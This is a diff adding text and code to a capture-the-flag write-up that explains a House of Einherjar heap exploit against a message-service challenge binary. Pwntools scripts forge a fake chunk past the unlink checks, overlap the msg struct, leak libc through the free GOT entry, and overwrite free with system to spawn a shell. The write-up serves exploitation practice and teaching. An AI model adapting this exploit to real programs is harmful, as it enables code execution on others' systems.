@@ -99,11 +99,105 @@ here is my brute force:
 Now, we are ready to exploit the house of einherjar!
 So lets say we have an overlapping chunks. what would we want to overwrite?
 There is the msg struct! it contains pointers to both the name, and the msg strings, and if we could tamper with the msg string and then use the edit function, we can get an arbitrary write primitive.
+Lets delete all the previous messages and allocate a new message:
+```py
+send_all()
+add_msg("TTTTTT", 'ttttttttt')
+```
+This is how it looks in the heap:
+![image](https://github.com/itaybel/Weekly-CTF/assets/56035342/ee3d17dc-ffe8-430b-a2d8-dd5aa993520e)
 
+Now, with our null byte overflow, we will create a fake chunk before the msg struct (i.e before 0x4062b0)
+By tampering with the chunk's prev_size, we can set prev_size = 0xf0, which will free the chunk located at `victim - 0xf0`. here is how it looks like in the heap:
+
+![image](https://github.com/itaybel/Weekly-CTF/assets/56035342/bb0a042d-2e71-4501-995b-7ff62cb6e708)
+
+To bypass malloc mitegaions, we need to make sure that `victim - 0xf0` size's field is indeed 0xf0. here is how I shaped it in my script:
 
 ```py
+    send_all()
+    prev_size = 0xf0
+    add_msg("a",  b"A" * 424 + p64(prev_size))
+
+    for i in range(6):
+        add_msg("t", "t")
+
+    
+    chunk_a = add_msg(b"B" * 0x70 + p64(prev_size), "a") #this will corrupt the next chunk size field
+    set_sender("AVOID CONSOLIDATION") #to avoid consolidation with the top chunk
+    send_all() #free! this will create link our fake chunk at `victim - 0xf0` to the unsorted bin.
+```
+
+if we try to run it, it will crash, because it will check the bk and the fd of our fake chunk:
+ ```c
+  if (__builtin_expect (fd->bk != p || bk->fd != p, 0))
+    malloc_printerr ("corrupted double-linked list");
+  fd->bk = bk;
+  bk->fd = fd;
+```
+
+Here is how it looks like in assembly: (RDI points to our fake chunk)
+```asm
+    0x7ffff7e82cd9    mov    rax, qword ptr [rdi + 0x10]
+    0x7ffff7e82cdd    mov    rdx, qword ptr [rdi + 0x18]
+    0x7ffff7e82ce1    cmp    rdi, qword ptr [rax + 0x18]
+    0x7ffff7e82ce5  ✔ jne    0x7ffff7e82d50                <0x7ffff7e82d50>
+    0x7ffff7e82d50    lea    rdi, [rip + 0x10801f]
+    0x7ffff7e82d57    call   0x7ffff7e81e60                <0x7ffff7e81e60>
+```
+So, it will check if `*(*(rdi + 0x10) + 0x18) == RDI`.
+Lets supply fd = bk = p (i.e *(rdi + 0x10) = *(rdi + 0x18) = rdi)
+The check will check if *(rdi + 0x18) == RDI. we can control rdi + 0x18, so we can just write the address of the chunk there. 
+It will have another check after it, which will check *(rdi + 0x20), so we write p's address twice.
+```py
+    prev_size = 0xf0
+    current_chunk_address = heap_base + 0x1500
+    add_msg("a",  b"A" * 424+ p64(prev_size)  + p64(current_chunk_address + 0x10) * 2+ p64(current_chunk_address) * 2)
+```
+
+Now, we'll allocate 6 chunks to fill up the tcache bins, and we trigger our null byte overflow bug. Then we free everything up, which will consolidate the chunk with our fake chunk of size 0xf0. this is how it looks like in the heap:
+
+![image](https://github.com/itaybel/Weekly-CTF/assets/56035342/db2a7471-ee17-4b59-840e-9b9490e336ec)
+
+This is our bins state after the consolidation:
+
+![image](https://github.com/itaybel/Weekly-CTF/assets/56035342/5e262ffc-6a6a-4102-a614-40f8c98391cf)
+
+the tcaches are full , so in order to get the unsortedd bin we need to allocate 7 messages.
+Then our next message's msg field will be allocated from our fake chunk, and we can overwrite the msg struct.
+We will change the msg pointer to a location we would like to read/write to (free got), and then use the edit function to leak its contents and write into it.
+In order for the edit function to find our msg, we need to change the name pointer aswell. The edit function will use `free` at the end with the name as a paremeter, so if we enter `/bin/sh` as the name, `free(/bin/sh)` will be called.
+But if we write into free got, the system address, system(/bin/sh) will be called. Here is my final part of the exploit:
 
 
+  ```
+  chunk_a = add_msg(b"B" * 0x70 + p64(prev_size), "/bin/sh\x00")
+  
+  set_sender("AVOID CONSOLIDATION")
+  
+  send_all()
+  input()
+  
+  for i in range(7):
+    add_msg()
+  
+  binshaddress = heap_base + 0x1600
+  free_got = 0x404018
+  
+  chunk = add_msg("J", b"X" * 72 + p64(0x21) + p64(binshaddress) + p64(free_got))
+  
+  p.recvuntil("> ")
+  p.sendline("3")
+  p.recvuntil("Name: ")
+  p.sendline("/bin/sh\x00") # this will be freed at the end, after the got overwrite
+  p.recvuntil("message: ")
+  libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x8cef0
+  p.recvuntil("message: ")
+  p.sendline(p64(libc.sym.system))
+```
+Final script:
+
+```py
 #!/usr/bin/env python3
 
 from pwn import *
@@ -188,9 +282,12 @@ def main():
     print("heap base", hex(heap_base))
 
     send_all()
-    prev_size = 0xf0
 
-    add_msg("a",  b"A" * (240 + 184) + p64(prev_size)  + p64(heap_base + 0x1510) + p64(heap_base + 0x1510) + p64(heap_base + 0x1500) * 2)
+    prev_size = 0xf0
+    current_chunk_address = heap_base + 0x1500
+
+    add_msg("a",  b"A" * 424+ p64(prev_size)  + p64(current_chunk_address + 0x10) * 2+ p64(current_chunk_address) * 2)
+
     for i in range(6):
         add_msg("t", "t")
 
@@ -198,8 +295,10 @@ def main():
     chunk_a = add_msg(b"B" * 0x70 + p64(prev_size), "/bin/sh\x00")
 
     set_sender("AVOID CONSOLIDATION")
-    input()
+
     send_all()
+    input()
+
     for i in range(7):
         add_msg()
 
@@ -211,7 +310,7 @@ def main():
     p.recvuntil("> ")
     p.sendline("3")
     p.recvuntil("Name: ")
-    p.sendline("/bin/sh\x00")
+    p.sendline("/bin/sh\x00") # this iwll be freed
     p.recvuntil("message: ")
     libc.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x8cef0
     p.recvuntil("message: ")
